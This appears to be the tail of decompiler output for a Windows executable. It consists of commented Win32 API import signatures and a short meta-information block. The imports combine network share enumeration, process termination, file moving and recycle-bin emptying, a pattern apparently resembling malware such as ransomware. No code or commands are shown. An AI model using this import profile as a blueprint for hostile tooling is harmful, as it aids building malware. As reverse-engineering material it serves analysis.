// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// BOOL GetModuleHandleExW(_In_ DWORD dwFlags, _In_opt_ LPCWSTR lpModuleName, _Out_ HMODULE * phModule);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// UINT GetOEMCP(void);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// HANDLE GetProcessHeap(VOID);
// VOID GetStartupInfoW(_Out_ LPSTARTUPINFOW lpStartupInfo);
// HANDLE GetStdHandle(_In_ DWORD nStdHandle);
// BOOL GetStringTypeW(_In_ DWORD dwInfoType, LPCWCH lpSrcStr, _In_ int cchSrc, _Out_ LPWORD lpCharType);
// VOID GetSystemTime(_Out_ LPSYSTEMTIME lpSystemTime);
// VOID GetSystemTimeAsFileTime(_Out_ LPFILETIME lpSystemTimeAsFileTime);
// DWORD GetTickCount(VOID);
// LPVOID HeapAlloc(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ SIZE_T dwBytes);
// BOOL HeapFree(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem);
// LPVOID HeapReAlloc(_Inout_ HANDLE hHeap, _In_ DWORD dwFlags, LPVOID lpMem, _In_ SIZE_T dwBytes);
// SIZE_T HeapSize(_In_ HANDLE hHeap, _In_ DWORD dwFlags, _In_ LPCVOID lpMem);
// BOOL InitializeCriticalSectionAndSpinCount(_Out_ LPCRITICAL_SECTION lpCriticalSection, _In_ DWORD dwSpinCount);
// VOID InitializeSListHead(_Out_ PSLIST_HEADER ListHead);
// unsigned InterlockedExchangeAdd(_Inout_ unsigned volatile * Addend, _In_ unsigned Value);
// BOOL IsDebuggerPresent(VOID);
// BOOL IsProcessorFeaturePresent(_In_ DWORD ProcessorFeature);
// BOOL IsValidCodePage(_In_ UINT CodePage);
// int LCMapStringW(_In_ LCID Locale, _In_ DWORD dwMapFlags, LPCWSTR lpSrcStr, _In_ int cchSrc, LPWSTR lpDestStr, _In_ int cchDest);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HMODULE LoadLibraryExW(_In_ LPCWSTR lpLibFileName, HANDLE hFile, _In_ DWORD dwFlags);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalFree(HLOCAL hMem);
// LPWSTR lstrcatW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrcmpiW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPWSTR lstrcpynW(LPWSTR lpString1, _In_ LPCWSTR lpString2, _In_ int iMaxLength);
// LPWSTR lstrcpyW(LPWSTR lpString1, _In_ LPCWSTR lpString2);
// int lstrlenW(_In_ LPCWSTR lpString);
// BOOL MoveFileW(_In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName);
// int MultiByteToWideChar(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCCH lpMultiByteStr, _In_ int cbMultiByte, LPWSTR lpWideCharStr, _In_ int cchWideChar);
// HANDLE OpenMutexW(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName);
// LPWSTR PathRemoveBackslashW(_Inout_ LPWSTR lpszPath);
// BOOL Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// BOOL QueueUserWorkItem(_In_ LPTHREAD_START_ROUTINE Function, _In_opt_ PVOID Context, _In_ ULONG Flags);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ResetEvent(_In_ HANDLE hEvent);
// VOID RtlUnwind(_In_opt_ PVOID TargetFrame, _In_opt_ PVOID TargetIp, _In_opt_ PEXCEPTION_RECORD ExceptionRecord, _In_ PVOID ReturnValue);
// UINT SetErrorMode(_In_ UINT uMode);
// BOOL SetEvent(_In_ HANDLE hEvent);
// BOOL SetFileAttributesW(_In_ LPCWSTR lpFileName, _In_ DWORD dwFileAttributes);
// BOOL SetFilePointerEx(_In_ HANDLE hFile, _In_ LARGE_INTEGER liDistanceToMove, _Out_opt_ PLARGE_INTEGER lpNewFilePointer, _In_ DWORD dwMoveMethod);
// VOID SetLastError(_In_ DWORD dwErrCode);
// BOOL SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle);
// LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(_In_opt_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// HINSTANCE ShellExecuteW(_In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpOperation, _In_ LPCWSTR lpFile, _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory, _In_ INT nShowCmd);
// HRESULT SHEmptyRecycleBinA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR pszRootPath, DWORD dwFlags);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCWSTR StrRStrIW(_In_ PCWSTR pszSource, _In_opt_ PCWSTR pszLast, _In_ PCWSTR pszSrch);
// PCWSTR StrStrIW(_In_ PCWSTR pszFirst, _In_ PCWSTR pszSrch);
// PCWSTR StrStrW(_In_ PCWSTR pszFirst, _In_ PCWSTR pszSrch);
// BSTR SysAllocString(const OLECHAR * psz);
// void SysFreeString(_In_opt_ BSTR bstrString);
// BOOL SystemTimeToFileTime(_In_ const SYSTEMTIME * lpSystemTime, _Out_ LPFILETIME lpFileTime);
// BOOL TerminateProcess(_In_ HANDLE hProcess, _In_ UINT uExitCode);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// LONG UnhandledExceptionFilter(_In_ struct _EXCEPTION_POINTERS * ExceptionInfo);
// HRESULT VariantClear(_Inout_ VARIANTARG * pvarg);
// void VariantInit(_Out_ VARIANTARG * pvarg);
// DWORD WaitForSingleObjectEx(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds, _In_ BOOL bAlertable);
// int WideCharToMultiByte(_In_ UINT CodePage, _In_ DWORD dwFlags, LPCWCH lpWideCharStr, _In_ int cchWideChar, LPSTR lpMultiByteStr, _In_ int cbMultiByte, _In_opt_ LPCCH lpDefaultChar, _Out_opt_ LPBOOL lpUsedDefaultChar);
// DWORD WNetCloseEnum(_In_ HANDLE hEnum);
// DWORD WNetEnumResourceW(_In_ HANDLE hEnum, _Inout_ LPDWORD lpcCount, LPVOID lpBuffer, _Inout_ LPDWORD lpBufferSize);
// DWORD WNetOpenEnumW(_In_ DWORD dwScope, _In_ DWORD dwType, _In_ DWORD dwUsage, _In_opt_ LPNETRESOURCEW lpNetResource, _Out_ LPHANDLE lphEnum);
// int32_t wnsprintfW(void);
// BOOL WriteConsoleW(_In_ HANDLE hConsoleOutput, const VOID * lpBuffer, _In_ DWORD nNumberOfCharsToWrite, _Out_opt_ LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft
// Detected functions: 587
